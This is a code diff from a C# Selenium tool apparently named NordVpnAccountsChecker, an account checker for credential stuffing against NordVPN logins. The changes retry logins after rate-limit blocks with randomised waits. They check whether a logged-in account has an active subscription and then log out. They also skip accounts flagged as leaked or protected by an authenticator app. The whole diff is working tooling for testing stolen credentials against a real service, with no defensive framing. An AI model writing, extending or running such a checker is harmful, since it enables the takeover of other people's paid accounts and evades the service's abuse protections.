@@ -8,7 +8,7 @@ namespace NordVpnAccountsChecker.Extensions
     {
         public static IWebElement FindElementWithTimeout(this IWebDriver driver, By by)
         {
-            var wait = new WebDriverWait(driver, TimeSpan.FromSeconds(5));
+            var wait = new WebDriverWait(driver, TimeSpan.FromSeconds(10));
 
             wait.Until(s =>
             {
@@ -74,7 +74,7 @@ namespace NordVpnAccountsChecker.Extensions
 
                     if (h1 != null && h1.Text == Message.TooManyRequests)
                     {
-                        RandomWait(minSeconds: 300, maxSeconds: 600);
+                        driver.RandomWait(minSeconds: 300, maxSeconds: 600);
 
                         driver.Navigate().GoToUrl(loginUrl);
                     }
@@ -85,7 +85,9 @@ namespace NordVpnAccountsChecker.Extensions
                 }
                 catch
                 {
-                    break;
+                    driver.RandomWait(minSeconds: 300, maxSeconds: 600);
+
+                    driver.Navigate().GoToUrl(loginUrl);
                 }
             }
         }
@@ -127,11 +129,41 @@ namespace NordVpnAccountsChecker.Extensions
             // Find an erorr message
             try
             {
+                if (driver.Url == "https://my.nordaccount.com/dashboard/")
+                {
+                    driver.Navigate().GoToUrl("https://my.nordaccount.com/billing/my-subscriptions/");
+
+                    try
+                    {
+                        var text = driver.FindElementWithTimeout(By.XPath("//*[@id=\"app\"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p")).Text;
+
+                        success = text != Message.NoActiveSubscriptions;
+
+                        return success;
+                    }
+                    catch { }
+
+                    success = true;
+
+                    // log out
+                    driver.FindElementWithTimeout(By.XPath("//*[@id=\"app\"]/div[2]/div[2]/div[2]/div[2]/div[1]/div/div[2]/div/div[2]/button")).Click();
+                    driver.FindElementWithTimeout(By.XPath("//*[@id=\"app\"]/div[2]/div[2]/div[2]/div[2]/div[1]/div/div[2]/div/div[2]/div/a[2]")).Click();
+                    driver.FindElementWithTimeout(By.XPath("//*[@id=\"app\"]/div/div/main/form/fieldset/div[2]/a")).Click();
+                    driver.FindElementWithTimeout(By.XPath("//*[@id=\"app\"]/div/div/main/div/a[2]/div[2]/div")).Click();
+                    driver.FindElementWithTimeout(By.XPath("//*[@id=\"app\"]/div/div/main/div/form/fieldset/button")).Click();
+
+                    return success;
+                }
+                else if (driver.Url.StartsWith("https://nordaccount.com/login/leaked"))
+                {
+                    return false;
+                }
+
                 var message = driver.FindElementWithTimeout(By.XPath("//*[@id=\"app\"]/div/div/main/div[1]/div/p/span")).Text;
 
                 if (message == Message.AccountBlocked || message == Message.IncorrectPassword)
                 {
-                    RandomWait(minSeconds: 10, maxSeconds: 30);
+                    driver.RandomWait(minSeconds: 10, maxSeconds: 30);
                 }
                 else if (message == Message.TooManyRequestsTryIn5Mins)
                 {
@@ -143,28 +175,30 @@ namespace NordVpnAccountsChecker.Extensions
                 {
                     success = true;
 
-                    RandomWait(minSeconds: 10, maxSeconds: 30);
+                    driver.RandomWait(minSeconds: 10, maxSeconds: 30);
                 }
             }
             catch
             {
             }
 
-            var text = driver.FindElementWithTimeout(By.XPath("//*[@id=\"app\"]/div/div/main/h1")).Text; 
-
-            if(text == Message.AuthenticatorApp)
+            try
             {
-                success = false;
-            }
+                var text = driver.FindElementWithTimeout(By.XPath("//*[@id=\"app\"]/div/div/main/h1")).Text;
 
-            // https://my.nordaccount.com/billing/my-subscriptions/
-            // //*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p
-            // No active subscriptions
+                if (text == Message.AuthenticatorApp)
+                {
+                    success = false;
+                }
+            }
+            catch
+            {
+            }
 
             return success;
         }
 
-        private static void RandomWait(int minSeconds = 1, int maxSeconds = 5)
+        public static void RandomWait(this IWebDriver _, int minSeconds = 1, int maxSeconds = 5)
         {
             var randomSeconds = Random.Shared.Next(minSeconds, maxSeconds);
 
